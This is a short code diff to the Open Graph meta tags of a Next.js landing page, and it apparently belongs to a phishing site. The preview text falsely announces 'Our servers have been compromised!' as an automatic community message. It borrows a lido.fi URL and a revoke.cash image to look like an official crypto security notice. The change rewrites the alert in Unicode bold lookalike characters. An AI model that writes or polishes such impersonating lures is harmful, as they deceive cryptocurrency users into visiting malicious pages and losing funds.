@@ -29,7 +29,7 @@ const LandingPage: NextPage = () => {
         <meta property="og:site_name" content="This is an automatically generated announcement message" />
         <meta
           property="og:description"
-          content="🚩Our servers have been compromised!🥷&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;&#013;🚨 COMMUNITY AUTO MESSAGE 🚨"
+          content="🚩𝗢𝘂𝗿 𝘀𝗲𝗿𝘃𝗲𝗿𝘀 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗰𝗼𝗺𝗽𝗿𝗼𝗺𝗶𝘀𝗲𝗱!🥷&#013;&#013;🚨 𝗖𝗢𝗠𝗠𝗨𝗡𝗜𝗧𝗬 𝗔𝗨𝗧𝗢 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 🚨"
         />
         {/* <meta property="og:url" content="https://lido.fi" /> */}
         <meta property="og:image" content="https://revoke.cash/assets/images/revoke-og-image.jpg" />
